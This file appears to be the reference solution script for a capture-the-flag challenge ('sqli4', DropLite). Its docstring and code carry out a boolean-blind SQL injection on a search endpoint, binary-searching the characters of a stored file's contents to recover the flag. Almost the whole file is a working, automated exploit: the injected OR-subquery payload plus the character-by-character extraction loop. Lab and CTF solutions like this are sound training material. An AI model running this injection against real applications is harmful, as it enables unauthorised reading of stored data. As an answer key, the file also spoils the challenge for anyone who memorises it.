#!/usr/bin/env python3
"""Reference solve for sqli4 (DropLite).

The search page builds its query by concatenation:

    SELECT id, name, size FROM files WHERE name LIKE '%<q>%'

and reports how many files match, so the match count is a boolean
oracle. With

    q = zzz' OR (SELECT unicode(substr(content,N,1)) FROM files
                WHERE name='quarterly-keys.txt') < M --

the count is non-zero exactly when the Nth character's code is below M
(nothing is named "zzz..."), which lets us binary-search the character
code. Repeating per position reads the file content - the flag - one
character at a time.

    python solve.py                 # localhost:8033
    python solve.py http://host:8033
"""
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8033")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
TARGET = "quarterly-keys.txt"
COUNT_RE = re.compile(r"(\d+) file")


def main() -> int:
    s = requests.Session()
    for _ in range(30):
        try:
            s.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)

    def count(q: str) -> int:
        r = s.get(BASE + "/search", params={"q": q}, timeout=10)
        m = COUNT_RE.search(r.text)
        return int(m.group(1)) if m else 0

    def pred_less(pos: int, c: int) -> bool:
        q = (f"zzz' OR (SELECT unicode(substr(content,{pos},1)) "
             f"FROM files WHERE name='{TARGET}') < {c} -- ")
        return count(q) > 0

    def char_at(pos: int) -> int:
        if pred_less(pos, 1):
            return 0
        lo, hi = 1, 128
        while hi - lo > 1:
            mid = (lo + hi) // 2
            if pred_less(pos, mid):
                hi = mid
            else:
                lo = mid
        return hi - 1

    text = ""
    pos = 1
    while pos <= 200:
        c = char_at(pos)
        if c == 0:
            break
        text += chr(c)
        pos += 1
        if text.startswith("flag{") and text.endswith("}"):
            break

    m = FLAG_RE.search(text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found in extracted text: {text!r}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
